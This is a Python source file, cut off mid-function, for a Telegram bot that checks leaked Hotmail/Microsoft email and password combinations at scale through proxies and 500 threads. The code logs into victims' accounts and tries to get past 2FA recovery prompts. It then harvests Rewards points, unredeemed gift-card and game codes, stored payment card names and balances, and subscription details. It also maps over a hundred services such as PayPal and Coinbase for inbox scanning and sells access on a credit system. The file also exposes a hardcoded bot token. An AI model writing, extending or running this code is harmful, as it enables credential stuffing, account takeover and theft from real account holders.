#!/usr/bin/env python3
"""
@larpsupport — AKAZA Hotmail Checker Bot
Full flux.py login (high CPM) + Rewards + Codes + Keyword Inbox Scan
Railway ready | No GUI | No CLI menus
"""

import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
from datetime import datetime, timedelta
from urllib.parse import quote, unquote, urlparse, parse_qs
import requests, urllib3
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# CONFIG
# ============================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")
ADMIN_ID  = int(os.environ.get("ADMIN_ID", "5944410248"))
DB_PATH   = os.environ.get("DB_PATH", "checker.db")
TAG       = "@larpsupport"

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

PROXIES_LIST: list = []
bot_executor = ThreadPoolExecutor(max_workers=500)
user_fast_mode: dict = {}

# ============================================================================
# EXCLUDE WORDS (flux.py)
# ============================================================================
EXCLUDE_WORDS = {
    'SWEEPSTAKES','STATUS','WINORDER','CONTEST','PLAGUE','REQUIEM','CUSTOM',
    'BUNDLEORDER','SURFACE','PROORDER','SERIES','POINTS','DONATION','CHILDREN',
    'RESEARCH','HOSPITALORDE','EDUCATION','EMPLOYMENTOR','RIGHTS','YOUORDER',
    'SEDSORDER','ATAORDER','CARDORDER','MICROSOFT','PRESENTKORT','KRORDER',
    'OFT-PRE','DIGITAL','COINSORDER','MOEDAS','OVERWATCHORD','MONEDASORDER',
    'ASSINATURA','GRATUITA','SPOTIFY','PREMIUM','MESESORDER','PRESENTE',
    'RESALET','NOURORDER','FOUNDATIONOR','YACOUB','LEAGUE','LEGENDS','RPORDER',
    'OVERWATCH','GAME','PASS','MINECOINS','ROBUX','GIFT','CARD','ORDER','CODE',
    'FOUND','DIGITAL-CODE','REDEMPTION','REDEEM','DOWNLOAD','INSTANT','DELIVERY',
    'ONLINE','ACCESS','CONTENT','DLC','EXPANSION','SEASON','TOKEN','CURRENCY',
    'VIRTUAL','ITEM'
}

# ============================================================================
# 100+ SERVICE KEYWORDS
# ============================================================================
SERVICE_KEYWORDS = {
    "instagram.com":"Instagram","mail.instagram.com":"Instagram",
    "facebook.com":"Facebook","facebookmail.com":"Facebook",
    "twitter.com":"Twitter/X","x.com":"Twitter/X",
    "tiktok.com":"TikTok","account.tiktok":"TikTok",
    "snapchat.com":"Snapchat","discord.com":"Discord","discordapp.com":"Discord",
    "telegram.org":"Telegram","reddit.com":"Reddit",
    "linkedin.com":"LinkedIn","e.linkedin.com":"LinkedIn",
    "twitch.tv":"Twitch","onlyfans.com":"OnlyFans","patreon.com":"Patreon",
    "vk.com":"VK","whatsapp.com":"WhatsApp","youtube.com":"YouTube",
    "pinterest.com":"Pinterest","tumblr.com":"Tumblr",
    "netflix.com":"Netflix","info@netflix.com":"Netflix",
    "spotify.com":"Spotify","disneyplus.com":"Disney+","hulu.com":"Hulu",
    "hbo.com":"HBO Max","hbomax.com":"HBO Max","primevideo.com":"Prime Video",
    "peacocktv.com":"Peacock","paramountplus.com":"Paramount+",
    "tidal.com":"Tidal","deezer.com":"Deezer","soundcloud.com":"SoundCloud",
    "xbox.com":"Xbox","xboxlive.com":"Xbox",
    "playstation.com":"PlayStation","sony@txn-email.playstation.com":"PlayStation",
    "nintendo.com":"Nintendo",
    "steampowered.com":"Steam","noreply@steampowered.com":"Steam",
    "epicgames.com":"Epic Games","riotgames.com":"Riot Games",
    "ubisoft.com":"Ubisoft","ea.com":"EA","blizzard.com":"Blizzard",
    "minecraft.net":"Minecraft","roblox.com":"Roblox","garena.com":"Garena",
    "rockstargames.com":"Rockstar","bethesda.net":"Bethesda","capcom.com":"Capcom",
    "square-enix.com":"Square Enix","bandainamco.com":"Bandai Namco",
    "noreply@id.supercell.com":"Supercell","supercell.com":"Supercell",
    "paypal.com":"PayPal","venmo.com":"Venmo","cash.app":"CashApp",
    "stripe.com":"Stripe","revolut.com":"Revolut","wise.com":"Wise",
    "coinbase.com":"Coinbase","binance.com":"Binance","kraken.com":"Kraken",
    "robinhood.com":"Robinhood","blockchain.com":"Blockchain",
    "amazon.com":"Amazon","ebay.com":"eBay","aliexpress.com":"AliExpress",
    "etsy.com":"Etsy","walmart.com":"Walmart","target.com":"Target",
    "shopify.com":"Shopify","nike.com":"Nike","adidas.com":"Adidas",
    "ubereats.com":"Uber Eats","doordash.com":"DoorDash",
    "grubhub.com":"GrubHub","deliveroo.com":"Deliveroo",
    "uber.com":"Uber","lyft.com":"Lyft","airbnb.com":"Airbnb",
    "booking.com":"Booking","expedia.com":"Expedia",
    "dropbox.com":"Dropbox","icloud.com":"iCloud",
    "nordvpn.com":"NordVPN","expressvpn.com":"ExpressVPN",
    "surfshark.com":"Surfshark","protonvpn.com":"ProtonVPN",
    "coursera.org":"Coursera","udemy.com":"Udemy",
    "duolingo.com":"Duolingo","grammarly.com":"Grammarly",
    "adobe.com":"Adobe","canva.com":"Canva","zoom.us":"Zoom",
    "slack.com":"Slack","notion.so":"Notion",
}

# ============================================================================
# DATABASE
# ============================================================================
class AkazaDatabase:
    def __init__(self, path):
        self.path = path
        self.init_db()

    def _conn(self):
        return sqlite3.connect(self.path, check_same_thread=False)

    def init_db(self):
        with self._conn() as c:
            c.execute("""CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
                join_date TEXT, access_expiry TEXT)""")
            c.execute("""CREATE TABLE IF NOT EXISTS settings (
                user_id INTEGER PRIMARY KEY,
                keywords TEXT DEFAULT '[]', threads INTEGER DEFAULT 10)""")
            c.execute("""CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)""")

    def add_user(self, uid, username, first_name):
        with self._conn() as c:
            c.execute("INSERT OR IGNORE INTO users (user_id,username,first_name,join_date) VALUES (?,?,?,?)",
                      (uid, username or '', first_name or '', datetime.now().isoformat()))
            c.execute("INSERT OR IGNORE INTO settings (user_id) VALUES (?)", (uid,))

    def is_banned(self, uid):
        if uid == ADMIN_ID: return False
        with self._conn() as c:
            r = c.execute("SELECT is_banned FROM users WHERE user_id=?", (uid,)).fetchone()
            return bool(r and r[0])

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        with self._conn() as c:
            r = c.execute("SELECT has_access,is_banned,access_expiry FROM users WHERE user_id=?", (uid,)).fetchone()
            if not r: return False
            has, banned, expiry = r
            if banned or not has: return False
            if expiry:
                try:
                    if datetime.fromisoformat(expiry) < datetime.now():
                        c.execute("UPDATE users SET has_access=0 WHERE user_id=?", (uid,))
                        return False
                except Exception: pass
            return True

    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        with self._conn() as c:
            r = c.execute("SELECT is_mod FROM users WHERE user_id=?", (uid,)).fetchone()
            return bool(r and r[0])

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        with self._conn() as c:
            r = c.execute("SELECT credits FROM users WHERE user_id=?", (uid,)).fetchone()
            return r[0] if r else 0

    def add_credits(self, uid, n):
        with self._conn() as c:
            c.execute("UPDATE users SET credits=credits+? WHERE user_id=?", (n, uid))

    def set_credits(self, uid, n):
        with self._conn() as c:
            c.execute("UPDATE users SET credits=? WHERE user_id=?", (n, uid))

    def reset_credits(self, uid):
        self.set_credits(uid, 0)

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        with self._conn() as c:
            c.execute("UPDATE users SET credits=MAX(0,credits-1), total_checks=total_checks+1 WHERE user_id=?", (uid,))

    def add_hit(self, uid):
        with self._conn() as c:
            c.execute("UPDATE users SET total_hits=total_hits+1 WHERE user_id=?", (uid,))

    def grant_access(self, uid):
        with self._conn() as c:
            c.execute("UPDATE users SET has_access=1,access_expiry=NULL WHERE user_id=?", (uid,))

    def revoke_access(self, uid):
        with self._conn() as c:
            c.execute("UPDATE users SET has_access=0 WHERE user_id=?", (uid,))

    def grant_timed(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        with self._conn() as c:
            c.execute("UPDATE users SET has_access=1,access_expiry=? WHERE user_id=?", (expiry, uid))

    def ban(self, uid):
        with self._conn() as c:
            c.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (uid,))

    def unban(self, uid):
        with self._conn() as c:
            c.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (uid,))

    def set_mod(self, uid, val):
        with self._conn() as c:
            c.execute("UPDATE users SET is_mod=? WHERE user_id=?", (val, uid))

    def get_all_uids(self):
        with self._conn() as c:
            return [r[0] for r in c.execute("SELECT user_id FROM users").fetchall()]

    def get_user_info(self, uid):
        with self._conn() as c:
            r = c.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
            if not r: return None
            cols = ['user_id','username','first_name','credits','has_access',
                    'is_banned','is_mod','total_checks','total_hits','join_date','access_expiry']
            return dict(zip(cols, r))

    def get_settings(self, uid):
        with self._conn() as c:
            r = c.execute("SELECT keywords,threads FROM settings WHERE user_id=?", (uid,)).fetchone()
            if not r: return {'keywords': [], 'threads': 10}
            try: kws = json.loads(r[0]) if r[0] else []
            except: kws = []
            return {'keywords': kws, 'threads': r[1] or 10}

    def update_settings(self, uid, keywords=None, threads=None):
        s = self.get_settings(uid)
        if keywords is not None: s['keywords'] = keywords
        if threads is not None: s['threads'] = threads
        with self._conn() as c:
            c.execute("INSERT OR REPLACE INTO settings (user_id,keywords,threads) VALUES (?,?,?)",
                      (uid, json.dumps(s['keywords']), s['threads']))

    def save_result(self, uid, email, status, details):
        with self._conn() as c:
            c.execute("INSERT INTO results (user_id,email,status,details,date) VALUES (?,?,?,?,?)",
                      (uid, email, status, json.dumps(details, default=str), datetime.now().isoformat()))

    def user_stats(self, uid):
        info = self.get_user_info(uid)
        if not info: return {'credits':0,'checks':0,'hits':0}
        return {'credits':info['credits'],'checks':info['total_checks'],'hits':info['total_hits']}

    def global_stats(self):
        with self._conn() as c:
            total  = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            active = c.execute("SELECT COUNT(*) FROM users WHERE has_access=1 AND is_banned=0").fetchone()[0]
            checks = c.execute("SELECT SUM(total_checks) FROM users").fetchone()[0] or 0
            hits   = c.execute("SELECT SUM(total_hits) FROM users").fetchone()[0] or 0
            return {'total':total,'active':active,'checks':checks,'hits':hits}

    def list_mods(self):
        with self._conn() as c:
            return [{'uid':r[0],'username':r[1]}
                    for r in c.execute("SELECT user_id,username FROM users WHERE is_mod=1").fetchall()]

    def get_all_users_preview(self):
        """Returns list of (uid, username, credits, has_access, checks, hits) for admin view."""
        with self._conn() as c:
            return c.execute(
                "SELECT user_id,username,credits,has_access,total_checks,total_hits "
                "FROM users ORDER BY total_hits DESC LIMIT 20").fetchall()

db = AkazaDatabase(DB_PATH)


# ============================================================================
# CHECKER ENGINE
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        if proxy:
            p = self._fmt(proxy)
            self.session.proxies = {'http': p, 'https': p}

    def _fmt(self, proxy):
        proxy = proxy.strip()
        if proxy.startswith(('http://','https://','socks')): return proxy
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return 'http://' + user + ':' + pwd + '@' + ip + ':' + port
        return 'http://' + proxy

    # ── STEP 1: get urlPost + PPFT (flux.py exact) ──
    def get_sftag(self):
        for _ in range(3):
            try:
                hdrs = {
                    'User-Agent': (
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                        'AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                text = self.session.get(SFTAG_URL, headers=hdrs, timeout=10, verify=False).text
                ppft = (
                    re.search(r'value=\\\\"(.+?)\\\\"', text, re.S) or
                    re.search(r'value="(.+?)"', text, re.S) or
                    re.search(r"sFTTag:'(.+?)'", text, re.S) or
                    re.search(r'sFTTag:"(.+?)"', text, re.S) or
                    re.search(r'name="PPFT".*?value="(.+?)"', text, re.S)
                )
                if ppft:
                    urlp = (
                        re.search(r'"urlPost":"(.+?)"', text, re.S) or
                        re.search(r"urlPost:'(.+?)'", text, re.S) or
                        re.search(r'<form.*?action="(.+?)"', text, re.S)
                    )
                    if urlp:
                        return urlp.group(1).replace('&amp;', '&'), ppft.group(1)
            except Exception: pass
            time.sleep(0.1)
        return None, None

    # ── STEP 2: login (flux.py exact) ──
    def do_login(self, email, password, urlpost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                hdrs = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': (
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                        'AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/91.0.4472.124 Safari/537.36'),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'close'
                }
                resp = self.session.post(urlpost, data=data, headers=hdrs,
                                         allow_redirects=True, timeout=10, verify=False)
                # Success — token in fragment
                if '#' in resp.url and resp.url != SFTAG_URL:
                    token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
                    if token and token != 'None':
                        return 'TOKEN', token
                # 2FA recovery
                elif 'cancel?mkt=' in resp.text:
                    try:
                        ipt   = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
                        uaid  = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
                        if ipt and pprid and uaid:
                            d2 = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            act = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
                            if act:
                                r2 = self.session.post(act.group(), data=d2,
                                                        allow_redirects=True, timeout=10, verify=False)
                                ru = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', r2.text)
                                if ru:
                                    fin = self.session.get(ru.group(), allow_redirects=True, timeout=10, verify=False)
                                    tk = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if tk and tk != 'None':
                                        return 'TOKEN', tk
                    except Exception: pass
                    return '2FA', None
                elif any(v in resp.text for v in [
                    'recover?mkt', 'account.live.com/identity/confirm?mkt',
                    'Email/Confirm?mkt', '/Abuse?mkt='
                ]):
                    return '2FA', None
                elif any(v in resp.text.lower() for v in [
                    'password is incorrect', "account doesn't exist",
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    'tried to sign in too many times',
                    'help us protect your account'
                ]):
                    return 'BAD', None
            except Exception: pass
            time.sleep(0.1)
        return 'BAD', None

    def _fmhf(self, resp):
        for _ in range(5):
            try:
                soup = BeautifulSoup(resp.text, 'html.parser')
                form = soup.find('form', id='fmHF')
                if not form: break
                act = form.get('action', '')
                if not act: break
                if act.startswith('/'): act = 'https://login.live.com' + act
                fd = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
                resp = self.session.post(act, data=fd, allow_redirects=True, timeout=10, verify=False)
            except Exception: break
        return resp

    # ── REWARDS POINTS ──
    def get_points(self):
        hdrs = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Referer': 'https://rewards.bing.com/',
            'Accept': 'application/json, text/plain, */*',
        }
        try:
            r = self.session.get('https://rewards.bing.com/api/getuserinfo', headers=hdrs, timeout=8, verify=False)
            d = r.json()
            pts = d.get('availablePoints') or d.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
            if pts is not None and 0 <= int(pts) <= 500000: return int(pts)
        except Exception: pass
        try:
            r = self.session.get('https://www.bing.com/rewardsapp/flyoutHub?format=json', headers=hdrs, timeout=8, verify=False)
            pts = r.json().get('userInfo', {}).get('balance')
            if pts is not None and 0 <= int(pts) <= 500000: return int(pts)
        except Exception: pass
        try:
            r = self.session.get('https://rewards.bing.com', headers=hdrs, timeout=10, verify=False)
            if 'fmHF' in r.text: r = self._fmhf(r)
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m:
                pts = int(m.group(1))
                if 0 <= pts <= 500000: return pts
        except Exception: pass
        return 0

    # ── REDEMPTION CODES (flux.py exact) ──
    def get_codes(self):
        found = []
        CODE_PATS = [
            r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
            r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
            r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
        ]
        try:
            url = 'https://rewards.bing.com/redeem/orderhistory'
            hdrs = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
                'Referer': 'https://rewards.bing.com/',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            r = self.session.get(url, headers=hdrs, timeout=10, verify=False)
            text = r.text
            if 'fmHF' in text or 'JavaScript required' in text:
                soup0 = BeautifulSoup(text, 'html.parser')
                form = soup0.find('form', id='fmHF') or soup0.find('form', attrs={'name': 'fmHF'})
                if form and form.get('action'):
                    act = form['action']
                    if act.startswith('/'): act = 'https://login.live.com' + act
                    fd = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
                    self.session.post(act, data=fd, timeout=10, verify=False, allow_redirects=True)
                    r2 = self.session.get(url, headers=hdrs, timeout=10, verify=False, allow_redirects=True)
                    text = r2.text
            soup = BeautifulSoup(text, 'html.parser')
            ver_token = ''
            ti = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            if ti and ti.get('value'): ver_token = ti['value']
            table = soup.find('table', class_='table')
            rows = []
            if table and table.tbody: rows = table.tbody.find_all('tr')
            elif table: rows = table.find_all('tr')
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                full_row = row.get_text(strip=True)
                order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ''
                order_date  = cells[1].get_text(strip=True) if len(cells) > 1 else ''
                cat = self._detect_cat(order_title, full_row)
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act_url = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act_url.startswith('/'): act_url = 'https://rewards.bing.com' + act_url
                    try:
                        pd = {}
                        if ver_token: pd['__RequestVerificationToken'] = ver_token
                        ch = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
                            'X-Requested-With': 'XMLHttpRequest',
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        }
                        cr = self.session.post(act_url, data=pd, headers=ch, timeout=10, verify=False)
                        chtml = cr.text
                        csoup = BeautifulSoup(chtml, 'html.parser')
                        code = None
                        # a) tango key/value
                        rs = csoup.find('div', class_='resendSuccess')
                        if rs:
                            keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                            vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                            for k, v in zip(keys, vals):
                                if 'CODE' in k.get_text(strip=True).upper() or 'PIN' in k.get_text(strip=True).upper():
                                    cand = v.get_text(strip=True)
                                    if '*' not in cand: code = cand; break
                        # b) regex patterns
                        if not code:
                            for pat in CODE_PATS:
                                m = re.search(pat, chtml)
                                if m and '*' not in m.group(0) and m.group(0) not in EXCLUDE_WORDS:
                                    code = m.group(0); break
                        # c) PIN:
                        if not code:
                            m = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', chtml, re.I)
                            if m and '*' not in m.group(1): code = m.group(1)
                        # d) CODE:
                        if not code:
                            m = re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', chtml, re.I)
                            if m and '*' not in m.group(1): code = m.group(1)
                        # e) pre/code tags
                        if not code:
                            for tag in csoup.find_all(['pre','code']):
                                t2 = tag.get_text(strip=True)
                                for pat in CODE_PATS:
                                    if re.match(pat, t2) and '*' not in t2:
                                        code = t2; break
                                if code: break
                        # f) clipboard
                        if not code:
                            for b2 in csoup.find_all('button', attrs={'data-clipboard-text': True}):
                                val = b2['data-clipboard-text'].strip()
                                if val and len(val) >= 15 and '*' not in val:
                                    code = val; break
                        # g) fallback generic
                        if not code:
                            for c2 in re.findall(
                                r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}(?:-[A-Z0-9]{4})?(?:-[A-Z0-9]{4})?',
                                chtml):
                                if '*' not in c2 and c2 not in EXCLUDE_WORDS:
                                    code = c2; break
                        # Redemption URL (gift cards)
                        rurl = ''
                        ci = self._code_info(order_title, cat, full_row)
                        if any(x in ci.lower() for x in ['gift','card','$','amazon','spotify']):
                            for up in [
                                r"<div class=['\"]tango-credential-key['\"]><a href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a></div>",
                                r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>',
                                r'<a[^>]*href="([^"]*)"[^>]*>Redeem</a>',
                                r'href="([^"]*redeem[^"]*)"',
                                r'Redemption URL:\s*(https?://[^\s<>"\']+)',
                            ]:
                                um = re.search(up, chtml, re.I | re.DOTALL)
                                if um: rurl = um.group(1).strip(); break
                        if code:
                            found.append({'code': code, 'category': cat,
                                          'info': ci, 'redemption_url': rurl,
                                          'date': order_date or datetime.now().strftime('%Y-%m-%d')})
                    except Exception: continue
                else:
                    code_cell = cells[3] if len(cells) > 3 else cells[2]
                    for pat in CODE_PATS:
                        for c2 in re.findall(pat, code_cell.get_text(strip=True).upper()):
                            if '*' in c2 or c2 in EXCLUDE_WORDS: continue
                            if len(c2.split('-')) < 3: continue
                            found.append({'code': c2, 'category': cat,
                                          'info': self._code_info(order_title, cat, full_row),
                                          'redemption_url': '', 'date': order_date})
            if not rows:
                for pat in CODE_PATS:
                    for c2 in re.findall(pat, soup.get_text().upper()):
                        if '*' in c2 or c2 in EXCLUDE_WORDS: continue
                        if sum(ch.isalnum() for ch in c2.replace('-','')) < 8: continue
                        found.append({'code': c2, 'category': 'Unknown',
                                      'info': 'CODE FOUND', 'redemption_url': '', 'date': ''})
        except Exception as e:
            logger.debug('Codes error: %s', e)
        return found

    def _detect_cat(self, title, row=''):
        t = (row or title).lower()
        if any(k in t for k in ['overwatch','owl tokens']): return 'Overwatch'
        if any(k in t for k in ['sea of thieves','ancient coins','alijo secreto']): return 'Sea of Thieves'
        if any(k in t for k in ['roblox','robux']): return 'Roblox'
        if any(k in t for k in ['league of legends','riot points','puntos riot']): return 'League of Legends'
        if any(k in t for k in ['game pass','gamepass','xbox game pass']): return 'Game Pass'
        if any(k in t for k in ['minecraft','minecoins']): return 'Minecraft'
        if any(k in t for k in ['gift card','giftcard','amazon','steam gift',
                                  'playstation','nintendo gift','target',
                                  'starbucks','subway','doordash','uber','walmart','spotify premium']):
            return 'Gift Card'
        return 'Unknown'

    def _code_info(self, title, cat, row=''):
        t = title.lower()
        if cat == 'Minecraft':
            m = re.search(r'(\d+)\s*(?:minecoins|coins)', t)
            return (m.group(1) + ' MINECOINS') if m else 'MINECRAFT CODE'
        if cat == 'Roblox':
            m = re.search(r'(\d+)\s*(?:robux|rbx)', t)
            return (m.group(1) + ' ROBUX') if m else 'ROBLOX CODE'
        if cat == 'League of Legends':
            m = re.search(r'(\d+)\s*(?:rp|riot)', t)
            return (m.group(1) + ' RP') if m else 'LOL CODE'
        if cat == 'Game Pass':
            m = re.search(r'(\d+)\s*month', t)
            return ((m.group(1) + ' MONTH GAME PASS') if m else 'GAME PASS CODE')
        if cat == 'Gift Card':
            m = re.search(r'\$(\d+)', t)
            amt = ('$' + m.group(1) + ' ') if m else ''
            for x in ['amazon','steam','playstation','xbox','nintendo',
                       'target','starbucks','subway','doordash','uber','walmart']:
                if x in t: return amt + x.upper() + ' GIFT CARD'
            return amt + 'GIFT CARD'
        return cat.upper() + ' CODE'

    # ── MICROSOFT SUBS (hit.py) ──
    def get_subs(self):
        result = {'status': 'FREE', 'subs': [], 'balance': '', 'card': ''}
        try:
            uid16 = uuid.uuid4().hex[:16]
            state = json.dumps({'userId': uid16, 'scopeSet': 'pidl'})
            surl = (
                'https://login.live.com/oauth20_authorize.srf'
                '?client_id=000000000004773A'
                '&response_type=token'
                '&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete'
                '&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth'
                '&state=' + quote(state) + '&prompt=none'
            )
            r = self.session.get(surl, headers={'Referer': 'https://account.microsoft.com/'},
                                  allow_redirects=True, timeout=15, verify=False)
            ptok = None
            for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pat, r.text + ' ' + r.url)
                if m: ptok = unquote(m.group(1)); break
            if not ptok: return result
            ph = {
                'Authorization': 'MSADELEGATE1.0="' + ptok + '"',
                'ms-cV': str(uuid.uuid4()),
                'Origin': 'https://account.microsoft.com',
                'Referer': 'https://account.microsoft.com/',
                'Accept': 'application/json',
            }
            try:
                rp = self.session.get(
                    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/'
                    'paymentInstrumentsEx?status=active,removed&language=en-US',
                    headers=ph, timeout=12, verify=False)
                bm = re.search(r'"balance"\s*:\s*([0-9.]+)', rp.text)
                if bm: result['balance'] = '$' + bm.group(1)
                cm = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"',
                               rp.text, re.DOTALL)
                if cm: result['card'] = cm.group(1)
            except Exception: pass
            try:
                rs = self.session.get(
                    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions',
                    headers=ph, timeout=12, verify=False)
                sub_kw = {
                    'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                    'PC Game Pass': 'PC GAME PASS',
                    'Xbox Game Pass': 'GAME PASS',
                    'EA Play': 'EA PLAY',
                    'Xbox Live Gold': 'XBOX LIVE GOLD',
                    'Microsoft 365 Family': 'M365 FAMILY',
                    'Microsoft 365 Personal': 'M365 PERSONAL',
                    'Office 365': 'OFFICE 365',
                    'OneDrive': 'ONEDRIVE',
                }
                for kw, name in sub_kw.items():
                    if kw in rs.text:
                        sub = {'name': name}
                        ren = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', rs.text)
                        if ren:
                            sub['renewal'] = ren.group(1)
                            try:
                                d = (datetime.fromisoformat(ren.group(1)) - datetime.now()).days
                                sub['days'] = d
                                sub['expired'] = d < 0
                            except Exception: pass
                        ar = re.search(r'"autoRenew"\s*:\s*(true|false)', rs.text)
                        if ar: sub['auto_renew'] = ar.group(1) == 'true'
                        result['subs'].append(sub)
                if result['subs']:
                    active = [s for s in result['subs'] if not s.get('expired')]
                    result['status'] = 'PREMIUM' if active else 'EXPIRED'
            except Exception: pass
        except Exception: pass
        return result

    # ── PROFILE ──
    def get_profile(self, access_token, cid):
        try:
            hdrs = {
                'Authorization': 'Bearer ' + access_token,
                'X-AnchorMailbox': 'CID:' + cid,
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
            }
            r = self.session.get(
                'https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                headers=hdrs, timeout=10, verify=False)
            data = r.json()
            accs = data.get('accounts', [{}])
            name    = accs[0].get('displayName') or data.get('displayName') or 'Unknown'
            country = accs[0].get('location') or accs[0].get('country') or data.get('country') or 'Unknown'
            return name, country
        except Exception:
            return 'Unknown', 'Unknown'

    # ── MINECRAFT ──
    def get_minecraft(self, access_token):
        try:
            xbl = self.session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    'Properties': {
                        'AuthMethod': 'RPS',
                        'SiteName': 'user.auth.xboxlive.com',
                        'RpsTicket': 'd=' + access_token
                    },
                    'RelyingParty': 'http://auth.xboxlive.com',
                    'TokenType': 'JWT'
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10, verify=False
            ).json()
            xbl_token = xbl.get('Token')
            userhash  = xbl.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
